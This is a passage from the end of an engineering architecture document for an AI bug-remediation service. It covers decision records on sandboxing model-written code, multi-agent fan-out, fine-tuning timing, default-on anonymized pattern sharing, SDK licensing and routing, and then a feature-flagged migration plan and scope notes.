- **Context:** CodeAct sandbox (Fase 5) needs execution environment for model-written code
- **Decision:** Deno subprocess with Pyodide loaded inside, not vm2 or plain isolated-vm
- **Rationale:** vm2 deprecated + CVSS 9.8 CVE; isolated-vm has active V8 escape research; Deno `--allow-none` + existing gVisor gives triple-layered isolation; langchain-sandbox production reference uses this exact pattern
- **Consequences:** +Deno binary in Docker image (~50MB), +Pyodide cache (~40MB), monthly CVE review discipline required

### ADR-002: Multi-agent fan-out over larger context window
- **Status:** Accepted
- **Context:** Tier 2/3 need higher success on complex bugs
- **Decision:** 3-5 sub-agents in parallel, each with focused context, rather than 1 agent with huge context
- **Rationale:** Anthropic research shows fan-out produces 60-80% faster completion on complex tasks; larger context burns more tokens linearly, parallel agents share token cost with wall time savings; focused context = better reasoning
- **Consequences:** Requires container pool capacity (N=5 per remediation), coordinator logic, Redis pub/sub infra

### ADR-003: Fine-tune in Fase 10, not Fase 3
- **Status:** Accepted
- **Context:** Could fine-tune early to save cost/latency
- **Decision:** Wait until ≥ 10,000 clean examples
- **Rationale:** Fine-tuning on small dataset produces worse model than base + good prompts; data volume + quality is the bottleneck; base models improve over calendar time (GPT-5.5, Opus 5 will land before our fine-tune matures)
- **Consequences:** Pay OpenAI API cost for longer; fine-tune benefits arrive 12-18 months in

### ADR-004: Community network default-on with anonymization
- **Status:** Accepted
- **Context:** Competitors (Sentry, Rollbar) don't do cross-project learning due to legal complexity
- **Decision:** Default-on with aggressive anonymization + opt-out switch; auto-contribute only after post-merge health pass
- **Rationale:** This is the moat; opt-in would kneecap adoption; strict anonymization + 7-day cooling + admin review of first 200 entries = acceptable legal posture; customer Security Addendum documents this explicitly
- **Consequences:** Legal counsel review required before ship; compliance posture in enterprise sales requires clear messaging

### ADR-005: SDK open-source, cloud subscription paywall
- **Status:** Accepted
- **Context:** Two options — pure open (OTel-style) or commercial license (MongoDB SSPL-style)
- **Decision:** Tailscale model — SDK fully open on npm + GitHub, premium features (peer mode remediation execution) require cloud subscription token validation
- **Rationale:** Matches existing `@inariwatch/capture` npm strategy; developers adopt freely (grows base); features that cost real money to deliver stay paywalled; can't be self-hosted without reimplementing the cloud
- **Consequences:** Token validation logic must be tamper-resistant in SDK; possible fork risk (someone forks SDK + implements their own cloud) — acceptable because our cloud is the value, not the SDK

### ADR-006: Tier Router as ML classifier, not rules
- **Status:** Accepted
- **Context:** Could hand-craft rules for tier routing
- **Decision:** `gpt-5-nano` classifier with fallback to rules; transitions to fine-tuned classifier in Fase 10
- **Rationale:** Rules can't capture the interaction of 8+ features; LLM classifier adapts as system evolves; cost of nano is trivial (~$0.0001/call)
- **Consequences:** Classifier needs eval + drift monitoring; rules remain as safety net

---

## 8. Migration Path from Current State

The current system isn't thrown away. It becomes Tier 2 (baseline) while new tiers are added.

**Ordering rationale:**
1. Telemetry (Fase 1) — required for everything
2. Infra (Fase 2) — required for capacity
3. Model routing (Fase 3) — immediate gains, low risk
4. Pre-push + webhooks (Fase 4) — CI reliability
5. CodeAct (Fase 5) — foundation for Pillar 3
6. Tier Router (Fase 6) — enables Tier 0/1
7. Fan-out (Fase 7) — Tier 2/3 upgrade
8. Gate parallelization (Fase 8) — final latency squeeze
9. Learning loops (Fase 9) — moat activation
10. Fine-tune (Fase 10) — cost moat
11. Substrate/EAP first-class (Fase 11) — enterprise differentiation
12. Observability (Fase 12) — operational maturity
13. Product surface (Fase 13) — ship to users

Each fase is feature-flagged with explicit kill switch:
- `REMEDIATION_MODEL_ROUTING`
- `CONTAINER_POOL_ENABLED`
- `PREPUSH_TESTS_ENABLED`
- `CI_WEBHOOK_MODE`
- `CODEACT_ENABLED`
- `TIER_ROUTER_ENABLED`
- `MULTI_AGENT_FANOUT`
- `GATES_PARALLEL`
- `AUTO_CONTRIBUTE_PATTERNS`
- `FINE_TUNED_MODEL_ENABLED`

Rollback for any fase = flip flag to false. No redeploys required.

---

## 9. Reference appendices

See companion documents:
- **`SDK_PEER_ARCHITECTURE.md`** — the enhanced path that amplifies Tiers 1/2/3 when user has SDK peer mode enabled. Required reading before implementing Fase 9 Loop 3 (runtime state dataset).
- **`PROTOCOL_SPEC.md`** — the bidirectional cloud↔SDK protocol, Ed25519 signing scheme, policy engine, token validation for Option B licensing. Required reading before Fase 5 if planning SDK integration.
- **`SECURITY_AND_COMPLIANCE_ROADMAP.md`** — security stack pre-SOC2, Incident Response Plan, audit program, compliance roadmap Year 1-3.

---

## 10. Out of scope

- Web dashboard redesign (separate track)
- Mobile app (`bot-app`) feature expansion (separate track)
- Rust CLI feature parity with web (CLI is intentionally a subset — see existing CLI vs Web doc in `CLAUDE.md`)
- Pricing page copy (Fase 13 mentions it but copywriting is separate)
- Marketing campaigns (separate track)
- Multi-region cloud deployment (single-region Hetzner is sufficient for Year 1-2)
- HIPAA / PCI-DSS certification (not in current ICP)

End of master architecture document.
